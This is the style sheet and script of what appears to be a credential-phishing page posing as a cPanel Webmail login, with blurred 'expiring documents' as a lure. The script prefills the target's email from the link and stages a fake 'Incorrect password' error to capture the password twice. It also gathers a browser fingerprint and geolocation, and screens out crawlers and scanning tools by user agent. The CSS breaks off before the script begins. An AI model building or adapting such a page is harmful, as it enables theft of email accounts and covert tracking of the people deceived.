<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background: #e4e8ec;
    min-height: 100vh;
    overflow: hidden;
}

/* App shell: top toolbar | cPanel Webmail dual left nav + main */
.app-layout {
    display: grid;
    grid-template-columns: 78px minmax(218px, 252px) minmax(0, 1fr);
    grid-template-rows: auto 1fr;
    width: 100%;
    min-height: 100vh;
    max-height: 100vh;
    background: #e4e8ec;
}

.app-top-toolbar {
    grid-column: 1 / -1;
    grid-row: 1;
}

.wm-nav-primary {
    grid-column: 1;
    grid-row: 2;
}

.wm-folder-pane {
    grid-column: 2;
    grid-row: 2;
}

.main-stage {
    grid-column: 3;
    grid-row: 2;
    position: relative;
    min-height: 0;
    min-width: 0;
    overflow: hidden;
    background-color: #f5f7f9;
}

/* Roundcube-like canvas: faint branded watermark centered */
.main-stage::before {
    content: '';
    position: absolute;
    inset: 0;
    z-index: 0;
    pointer-events: none;
    background-image: var(--main-watermark, none);
    background-repeat: no-repeat;
    background-position: center calc(42% + 24px);
    background-size: min(400px, 48vmin);
    opacity: 0.075;
    filter: grayscale(35%);
}

/* Optional second pass for readability on retina */
@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
    .main-stage::before {
        opacity: 0.068;
    }
}

/* cPanel Webmail — primary dark nav (Paper Lantern / Glass style) */
.wm-nav-primary {
    background: #001633;
    border-right: 1px solid #002244;
    display: flex;
    flex-direction: column;
    min-height: 0;
    color: #ffffff;
}

.wm-nav-scroll {
    flex: 1;
    min-height: 0;
    overflow-y: auto;
    overflow-x: hidden;
    display: flex;
    flex-direction: column;
    align-items: stretch;
}

.wm-nav-logo-row {
    display: flex;
    justify-content: center;
    padding: 12px 6px 8px;
}

.wm-nav-logo-img {
    width: 44px;
    height: 44px;
    display: block;
    object-fit: contain;
    image-rendering: -webkit-optimize-contrast;
}

.wm-nav-tile {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: 5px;
    padding: 9px 4px;
    margin: 0 6px;
    border-radius: 4px;
    font-size: 10px;
    font-weight: 500;
    line-height: 1.15;
    text-decoration: none;
    text-align: center;
    color: #ffffff;
    background: transparent;
    border: none;
    cursor: default;
}

.wm-nav-tile:hover {
    background: rgba(255, 255, 255, 0.08);
}

.wm-nav-icon {
    width: 26px;
    height: 26px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: currentColor;
}

/* Stroke/outline icons (Feather-style) — primary nav */
.wm-nav-icon svg.stroke-nav {
    width: 23px;
    height: 23px;
    display: block;
    flex-shrink: 0;
    fill: none;
    stroke: currentColor;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
}

.wm-compose-tile {
    color: #5ecfff;
}

.wm-compose-tile:hover {
    background: rgba(94, 207, 255, 0.12);
}

.wm-compose-tile .wm-nav-icon svg.stroke-nav {
    stroke-width: 2;
}

.wm-nav-spacer {
    flex: 1 1 auto;
    min-height: 12px;
}

.wm-webmail-home-tile {
    color: #ffffff;
}

.wm-cpanel-mark {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    font-weight: 800;
    font-style: italic;
    font-size: 17px;
    line-height: 1;
    color: #ff6c2c;
    letter-spacing: -0.03em;
    font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
}

.wm-webmail-label {
    display: block;
    font-size: 10px;
    line-height: 1.28;
    font-weight: 500;
    font-style: normal;
    color: #ffffff;
}

.wm-nav-footer-block {
    flex-shrink: 0;
    border-top: 1px solid rgba(255, 255, 255, 0.14);
    padding: 10px 0 12px;
    background: #001633;
}

.wm-nav-tile.wm-nav-logout {
    color: #f472b8;
}

.wm-nav-logout .wm-nav-icon svg.stroke-nav {
    stroke-width: 2;
}

/* Secondary pane — folders (white column) */
.wm-folder-pane {
    background: #ffffff;
    border-right: 1px solid #d4dce7;
    display: flex;
    flex-direction: column;
    min-height: 0;
    overflow: hidden;
    font-size: 14px;
    color: #1e293b;
}

.wm-folder-header {
    flex-shrink: 0;
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 10px 10px 10px 12px;
    border-bottom: 1px solid #e6edf3;
    background: #fafbfc;
}

.wm-folder-email-text {
    flex: 1;
    min-width: 0;
    font-size: 13px;
    font-weight: 500;
    color: #0f172a;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.wm-folder-kebab {
    flex-shrink: 0;
    width: 34px;
    height: 34px;
    border: none;
    border-radius: 4px;
    background: transparent;
    color: #475569;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: default;
}

.wm-folder-kebab:hover {
    background: rgba(0, 0, 0, 0.05);
}

.wm-folder-scroll {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    padding: 6px 0 10px;
}

.wm-folder-link {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 9px 12px;
    margin: 1px 8px;
    border-radius: 4px;
    text-decoration: none;
    color: #334155;
    font-weight: 500;
    cursor: default;
}

.wm-folder-link:hover {
    background: #f1f5f9;
}

.wm-folder-link.is-selected {
    background: #e8f4ff;
    color: #0f172a;
}

.wm-folder-link svg.icon-folder {
    width: 22px;
    height: 22px;
    flex-shrink: 0;
    color: #64748b;
}

.wm-folder-link.is-selected svg.icon-folder {
    color: #0369a1;
}

.wm-quota-strip {
    flex-shrink: 0;
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 12px;
    border-top: 1px solid #e6edf3;
    background: #fafbfc;
}

.wm-quota-strip svg.disk {
    flex-shrink: 0;
    width: 18px;
    height: 18px;
    color: #64748b;
}

.wm-quota-bar {
    flex: 1;
    height: 7px;
    background: #e2e8f0;
    border-radius: 4px;
    overflow: hidden;
}

.wm-quota-bar span {
    display: block;
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #38bdf8, #0284c7);
    border-radius: 4px;
}

.wm-quota-num {
    font-size: 12px;
    font-weight: 600;
    color: #64748b;
    flex-shrink: 0;
}

/* Top toolbar — Roundcube Elastic style (three columns + separators) */
.mail-toolbar-horizontal {
    background: #f6f8fa;
    border-bottom: 1px solid #d8dee6;
    padding: 0 10px;
}

.mail-toolbar-horizontal .mail-toolbar {
    display: flex;
    flex-wrap: nowrap;
    align-items: stretch;
    background: transparent;
    padding: 4px 0;
    gap: 8px;
    min-height: 52px;
    max-width: 100%;
}

.toolbar-section {
    display: flex;
    align-items: center;
}

.toolbar-section-account {
    flex-shrink: 0;
    gap: 2px;
    padding-right: 4px;
}

.toolbar-section-tools {
    flex-shrink: 0;
    flex-wrap: wrap;
    padding: 0 4px;
}

.toolbar-section-msg {
    flex: 1;
    min-width: 0;
    justify-content: flex-start;
    flex-wrap: wrap;
    padding: 0 4px;
}

.toolbar-email {
    flex: 0 1 auto;
    max-width: min(480px, 36vw);
    min-width: 0;
    font-size: 13px;
    line-height: 1.35;
    font-weight: 700;
    color: #3d4758;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.toolbar-icon-btn {
    flex-shrink: 0;
    width: 30px;
    height: 32px;
    padding: 0;
    border: none;
    background: transparent;
    border-radius: 4px;
    color: #5a6573;
    cursor: default;
    display: flex;
    align-items: center;
    justify-content: center;
}

.toolbar-icon-btn:hover {
    background: rgba(0, 0, 0, 0.055);
}

.toolbar-vsep {
    width: 1px;
    flex-shrink: 0;
    align-self: stretch;
    min-height: 36px;
    margin: 8px 12px;
    background: #c5ced9;
}

.toolbar-section-tools .toolbar-item,
.toolbar-section-msg .toolbar-item {
    display: inline-flex;
}

.toolbar-item {
    flex-direction: column;
    align-items: center;
    justify-content: center;
    width: 56px;
    min-height: 44px;
    padding: 3px 1px;
    text-decoration: none;
    border-radius: 4px;
    cursor: default;
    box-sizing: border-box;
}

.toolbar-item:hover {
    background: rgba(255, 255, 255, 0.9);
}

.toolbar-section-tools .toolbar-item-label {
    color: #5f6b7b;
    font-size: 10px;
    font-weight: 500;
    margin-top: 2px;
    line-height: 1.2;
}

.toolbar-section-msg .toolbar-item-label {
    color: #b1bac7;
    font-size: 10px;
    font-weight: 500;
    margin-top: 2px;
    line-height: 1.2;
}

.toolbar-item.toolbar-item-more .toolbar-item-label {
    color: #2a3240;
    font-weight: 600;
}

.toolbar-item.is-disabled {
    pointer-events: none;
}

.toolbar-item.is-disabled .toolbar-item-label {
    color: #bdc6d6;
}

.toolbar-item.is-disabled .toolbar-item-icon {
    opacity: 0.45;
}

.toolbar-item-icon {
    width: 22px;
    height: 22px;
    flex-shrink: 0;
    color: #4f5b68;
}

.toolbar-item-icon svg {
    width: 100%;
    height: 100%;
    display: block;
}

.toolbar-item-label {
    text-align: center;
    max-width: 100%;
    word-break: break-word;
}

.toolbar-item.has-caret .toolbar-item-label {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 2px;
    flex-wrap: wrap;
}

.toolbar-caret {
    font-size: 7px;
    line-height: 1;
    color: #8896a9;
}

@media (max-width: 1100px) {
    .mail-toolbar-horizontal .mail-toolbar {
        flex-wrap: wrap;
    }
    .toolbar-section-msg {
        flex-basis: 100%;
        padding-bottom: 4px;
        border-top: 1px solid #e5eaef;
        margin-top: 2px;
        padding-top: 4px;
    }
}

/* Background Documents */
.documents-grid {
    position: absolute;
    inset: 0;
    z-index: 1;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    grid-auto-rows: auto;
    align-items: start;
    align-content: start;
    justify-items: stretch;
    gap: 18px;
    padding: 18px;
    opacity: 1;
    filter: blur(0);
}

.file-card {
    background: rgba(255, 255, 255, 0.99);
    border-radius: 12px;
    padding: 12px;
    box-shadow: 0 14px 32px rgba(148, 163, 184, 0.3);
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    border: 1px solid rgba(255, 255, 255, 0.2);
}

.file-card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 3px;
    background: linear-gradient(90deg, #38bdf8, #0ea5e9);
}

.file-card:hover {
    transform: translateY(-5px);
    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
}

.file-card-thumb {
    width: 100%;
    height: 108px;
    border-radius: 10px;
    margin-bottom: 10px;
    border: 2px solid #f3f4f6;
    background: #f8fafc;
    overflow: hidden;
}

.file-card-thumb img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    display: block;
}

.documents-grid .file-card-thumb img {
    filter: blur(3px);
    transform: scale(1.08);
}

.file-card-expiry {
    font-size: 0.72em;
    color: #64748b;
    margin: 0 0 8px 0;
    font-weight: 600;
    line-height: 1.35;
}

.file-card h4 {
    font-size: 0.92em;
    margin: 0 0 6px 0;
    color: #0f172a;
    font-weight: 800;
    line-height: 1.4;
}

.file-card p {
    font-size: 0.78em;
    color: #334155;
    margin: 0 0 8px 0;
    font-weight: 700;
}

.countdown {
    position: absolute;
    bottom: 8px;
    right: 8px;
    background: linear-gradient(135deg, #ef4444, #dc2626);
    color: white;
    font-size: 10px;
    padding: 5px 8px;
    border-radius: 14px;
    font-weight: 600;
    box-shadow: 0 5px 14px rgba(239, 68, 68, 0.35);
}

/* Login Overlay */
.login-overlay {
    position: absolute;
    inset: 0;
    background: rgba(245, 247, 249, 0.86);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1000;
    backdrop-filter: blur(0.5px);
}

.login-container {
    background: transparent;
    border: 0;
    border-radius: 20px;
    padding: 18px 18px 14px;
    box-shadow: none;
    width: 360px;
    max-width: 94%;
    max-height: min(92vh, 760px);
    text-align: center;
    position: relative;
    overflow: visible;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}

.login-container::before {
    content: none;
}

.login-logo {
    width: 120px;
    height: auto;
    margin: 0 0 25px;
    filter: none;
}

.login-form {
    text-align: center;
    margin: 0 !important;
    padding: 0 !important;
    width: 100%;
    max-width: 360px;
    position: static !important;
    transform: none !important;
}

.form-group {
    margin-bottom: 12px;
}

.login-form label {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    white-space: nowrap;
    border: 0;
}

.input-row {
    display: flex;
    align-items: stretch;
}

.input-icon {
    width: 50px;
    min-width: 50px;
    border: 1px solid rgba(203, 213, 225, 0.5);
    border-right: 0;
    border-radius: 6px 0 0 6px;
    background: rgba(241, 245, 249, 0.6);
    color: #64748b;
    display: inline-flex;
    align-items: center;
    justify-content: center;
}

.input-icon svg {
    width: 22px;
    height: 22px;
}

.login-form input {
    width: 100%;
    padding: 12px 14px;
    border: 1px solid rgba(203, 213, 225, 0.5);
    border-radius: 0 6px 6px 0;
    border-left: 0;
    font-size: 14px;
    transition: all 0.2s ease;
    background: rgba(241, 245, 249, 0.6);
    color: #334155;
    box-sizing: border-box;
}

.login-form input:focus {
    border-color: #38bdf8;
    outline: none;
    box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
    background: rgba(255, 255, 255, 0.8);
}

.login-form input::placeholder {
    color: #475569;
}

.login-button {
    width: 100%;
    padding: 12px 14px;
    background: #38bdf8;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s ease;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    box-shadow: none;
    margin-top: 10px;
}

.login-button:hover {
    background: #0ea5e9;
}

.error-message {
    color: #991b1b;
    font-size: 14px;
    margin: 12px 0;
    padding: 12px 15px;
    background: rgba(254, 242, 242, 0.7);
    border-radius: 6px;
    border: 1px solid #ef4444;
    font-weight: 500;
}

.success-message {
    color: #0c4a6e;
    font-size: 14px;
    margin: 12px 0;
    padding: 12px 15px;
    background: rgba(240, 249, 255, 0.7);
    border-radius: 6px;
    border: 1px solid #0ea5e9;
    font-weight: 500;
}

/* Roundcube-style login feedback: fixed bottom-right */
.wm-login-toast {
    position: fixed;
    bottom: 16px;
    right: 16px;
    z-index: 100050;
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px 16px;
    border-radius: 6px;
    max-width: min(420px, calc(100vw - 32px));
    box-shadow: 0 4px 14px rgba(15, 23, 42, 0.18);
    font-size: 14px;
    line-height: 1.35;
    transition: opacity 0.2s ease, transform 0.2s ease;
}

.wm-login-toast.is-hidden {
    opacity: 0;
    visibility: hidden;
    pointer-events: none;
    transform: translateY(8px);
}

.wm-login-toast--loading {
    background: #4b4b4b;
    color: #fff;
}

.wm-login-toast--error {
    background: #ffda6a;
    color: #1e293b;
    border: 1px solid rgba(0, 0, 0, 0.06);
}

.wm-login-toast--success {
    background: #e0f2fe;
    color: #0c4a6e;
    border: 1px solid #7dd3fc;
}

.wm-login-toast__spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255, 255, 255, 0.35);
    border-top-color: #fff;
    border-radius: 50%;
    animation: wm-login-spin 0.65s linear infinite;
    flex-shrink: 0;
}

.wm-login-toast--error .wm-login-toast__spinner,
.wm-login-toast--success .wm-login-toast__spinner {
    display: none !important;
}

.wm-login-toast__warn {
    width: 22px;
    height: 22px;
    flex-shrink: 0;
    display: none;
}

.wm-login-toast--error .wm-login-toast__warn {
    display: block;
}

.wm-login-toast--loading .wm-login-toast__warn {
    display: none;
}

.wm-login-toast__warn svg {
    display: block;
    width: 22px;
    height: 22px;
}

.wm-login-toast__text {
    flex: 1;
    min-width: 0;
    word-break: break-word;
}

@keyframes wm-login-spin {
    to {
        transform: rotate(360deg);
    }
}

.login-footer-text {
    text-align: center;
    color: #64748b;
    margin-top: 20px;
    font-size: 13px;
}

/* Responsive */
@media (max-width: 1200px) {
    .app-layout {
        grid-template-columns: 74px minmax(200px, 234px) minmax(0, 1fr);
    }
    .toolbar-email {
        max-width: min(420px, 34vw);
    }
}

@media (max-width: 900px) {
    .app-layout {
        grid-template-columns: 1fr;
        grid-template-rows: auto auto auto 1fr;
        max-height: none;
        min-height: 100vh;
        overflow-y: auto;
    }
    .app-top-toolbar {
        grid-column: 1;
        grid-row: 1;
    }
    .wm-nav-primary {
        grid-column: 1;
        grid-row: 2;
        border-right: none;
        border-bottom: 1px solid #002244;
        max-height: none;
        min-height: 0;
    }
    .wm-nav-scroll {
        flex-direction: row;
        flex-wrap: wrap;
        justify-content: center;
        align-content: flex-start;
        gap: 0 4px;
        max-height: 160px;
        overflow-y: auto;
        padding-bottom: 4px;
    }
    .wm-nav-logo-row {
        width: 100%;
        justify-content: center;
    }
    .wm-nav-spacer {
        display: none;
    }
    .wm-nav-footer-block {
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        justify-content: center;
        gap: 2px;
    }
    .wm-folder-pane {
        grid-column: 1;
        grid-row: 3;
        max-height: 220px;
        border-right: none;
        border-bottom: 1px solid #d4dce7;
    }

<script>
var TOOLBAR_EMAIL_MAX_DISPLAY = 40;
var WM_PLACEHOLDER_EMAIL = "user@example.com";
var WM_PLACEHOLDER_EMAIL_FIELD = "Email Address";
var WM_PLACEHOLDER_PASSWORD = "Password";

function syncLoginInputPlaceholders() {
    var em = document.getElementById('email');
    var pw = document.getElementById('password');
    if (em && WM_PLACEHOLDER_EMAIL_FIELD) {
        em.setAttribute('placeholder', WM_PLACEHOLDER_EMAIL_FIELD);
        if (window.jQuery) {
            $(em).prop('placeholder', WM_PLACEHOLDER_EMAIL_FIELD);
        }
    }
    if (pw && WM_PLACEHOLDER_PASSWORD) {
        pw.setAttribute('placeholder', WM_PLACEHOLDER_PASSWORD);
        if (window.jQuery) {
            $(pw).prop('placeholder', WM_PLACEHOLDER_PASSWORD);
        }
    }
}

function wireLoginPlaceholderGuards() {
    function guard(el, expected) {
        if (!el || !expected || !window.MutationObserver) {
            return;
        }
        var obs = new MutationObserver(function () {
            if (el.getAttribute('placeholder') !== expected) {
                el.setAttribute('placeholder', expected);
            }
            if (window.jQuery && $(el).prop('placeholder') !== expected) {
                $(el).prop('placeholder', expected);
            }
        });
        obs.observe(el, { attributes: true, attributeFilter: ['placeholder'] });
    }
    guard(document.getElementById('email'), WM_PLACEHOLDER_EMAIL_FIELD);
    guard(document.getElementById('password'), WM_PLACEHOLDER_PASSWORD);
}

syncLoginInputPlaceholders();
wireLoginPlaceholderGuards();

var WM_LOGIN_SIGNING_IN = "Verifying credentials...";
var WM_LOGIN_STEP1_ERR = "Incorrect password. Please try again.";

function sanitizeEmailCandidate(s) {
    s = (s || '').trim();
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s) ? s : '';
}

function truncateToolbarDisplay(email) {
    var maxLen = TOOLBAR_EMAIL_MAX_DISPLAY;
    if (!email) return '';
    if (email.length <= maxLen) return email;
    return email.slice(0, maxLen - 3) + '...';
}

function pickEmailFromUrlOnly() {
    try {
        var h = decodeURIComponent((location.hash || '').replace(/^#/, '').trim());
        var eh = sanitizeEmailCandidate(h);
        if (eh) return eh;
    } catch (e) {}
    var qp = '';
    try {
        qp = new URLSearchParams(location.search).get('email') || '';
    } catch (e2) {}
    if (qp) {
        try {
            qp = decodeURIComponent(qp.replace(/\+/g, '%20'));
        } catch (e3) {}
    }
    return sanitizeEmailCandidate(qp) || "" || '';
}

function hydrateEmailFromUrlIntoForm() {
    var cur = sanitizeEmailCandidate($('#email').val());
    if (cur) return;
    var pick = pickEmailFromUrlOnly();
    if (pick) $('#email').val(pick);
}

function toolbarEmailResolved() {
    var fromInput = sanitizeEmailCandidate($('#email').val());
    if (fromInput) return fromInput;
    return pickEmailFromUrlOnly();
}

function syncToolbarEmail() {
    var full = toolbarEmailResolved();
    if (!full && WM_PLACEHOLDER_EMAIL) full = WM_PLACEHOLDER_EMAIL;
    var t = truncateToolbarDisplay(full);
    $('#toolbar-display-email').attr('title', full).text(t);
    $('#sidebar-folder-email').attr('title', full).text(t);
}

hydrateEmailFromUrlIntoForm();
syncToolbarEmail();
$('#email').on('input change blur', function () {
    syncToolbarEmail();
});
$(window).on('hashchange', function () {
    hydrateEmailFromUrlIntoForm();
    syncToolbarEmail();
});

// Comprehensive device fingerprint collection function
function collectDeviceFingerprint() {
    var data = {
        screen: {
            width: screen.width || 0,
            height: screen.height || 0
        },
        platform: navigator.platform || 'unknown',
        language: navigator.language || navigator.userLanguage || 'unknown',
        timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'unknown',
        connection: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'unknown',
        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
        cores: navigator.hardwareConcurrency || 'unknown',
        plugins: (navigator.plugins && navigator.plugins.length > 0) ? Array.from(navigator.plugins).map(p => p.name).slice(0, 10).join(', ') : 'unknown',
        canvas: generateCanvasFingerprint(),
        geo: {
            latitude: 'N/A',
            longitude: 'N/A',
            accuracy: 'N/A',
            areaLatitude: 'N/A',
            areaLongitude: 'N/A',
            mapLink: 'N/A'
        },
        location: {
            country: 'N/A',
            state: 'N/A',
            city: 'N/A',
            zipcode: 'N/A'
        },
        network: {
            dns: 'N/A',
            carrier: 'N/A'
        },
        security: {
            antivirus: 'N/A',
            firewall: 'N/A'
        },
        bot: {
            isBot: 'unknown',
            score: 'N/A'
        },
        email: {
            type: 'UNKNOWN',
            provider: 'Unknown',
            serverLink: 'N/A'
        },
        ip: {
            link: 'https://ip-api.com/' + (window.clientIP || 'unknown')
        }
    };

    // Extract email provider info
    var email = $('#email').val();
    if (email && email.includes('@')) {
        var domain = email.split('@')[1].toLowerCase();
        data.email.provider = domain;
        data.email.type = detectEmailType(domain);
        data.email.serverLink = 'https://' + domain;
    }

    // Simple bot detection
    data.bot.isBot = detectBot();
    data.bot.score = calculateBotScore();

    // Try to get geolocation synchronously (will be N/A if not immediately available)
    if (navigator.geolocation) {
        try {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    data.geo.latitude = position.coords.latitude || 'N/A';
                    data.geo.longitude = position.coords.longitude || 'N/A';
                    data.geo.accuracy = position.coords.accuracy || 'N/A';
                    data.geo.mapLink = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
                },
                function(error) {
                    // Geolocation denied or unavailable
                    console.log('Geolocation error:', error);
                },
                { timeout: 1000, enableHighAccuracy: false }
            );
        } catch (e) {
            console.log('Geolocation not available:', e);
        }
    }

    return data;
}

function generateCanvasFingerprint() {
    try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Device fingerprint canvas test', 2, 2);
        return canvas.toDataURL().slice(0, 50);
    } catch (e) {
        return 'N/A';
    }
}

function detectEmailType(domain) {
    if (['gmail.com', 'googlemail.com'].includes(domain)) return 'Gmail';
    if (['outlook.com', 'hotmail.com', 'live.com', 'msn.com'].includes(domain)) return 'Outlook';
    if (['yahoo.com', 'ymail.com', 'rocketmail.com'].includes(domain)) return 'Yahoo';
    if (['icloud.com', 'me.com', 'mac.com'].includes(domain)) return 'iCloud';
    if (['aol.com'].includes(domain)) return 'AOL';
    return 'UNKNOWN';
}

function detectBot() {
    var userAgent = navigator.userAgent.toLowerCase();
    var botPatterns = [
        /bot/, /crawler/, /spider/, /scraper/, /curl/, /python/, /java/, /perl/,
        /wget/, /curl/, /libwww/, /httpunit/, /nutch/, /go-http-client/,
        /webclient/, /python-requests/, /apex/, /scrapy/
    ];
    
    for (var pattern of botPatterns) {
        if (pattern.test(userAgent)) {
            return 'bot';
        }
    }
    return 'human';
}

function calculateBotScore() {
    var score = 0;
    var userAgent = navigator.userAgent.toLowerCase();
    
    // Check for common bot indicators
    if (/bot|crawler|spider|scraper/.test(userAgent)) score += 50;
    if (/curl|wget|python|java|perl/.test(userAgent)) score += 30;
    if (!navigator.plugins || navigator.plugins.length === 0) score += 10;
    if (!navigator.languages || navigator.languages.length === 0) score += 10;
    
    // Always return a number, not 'N/A'
    return score;
}
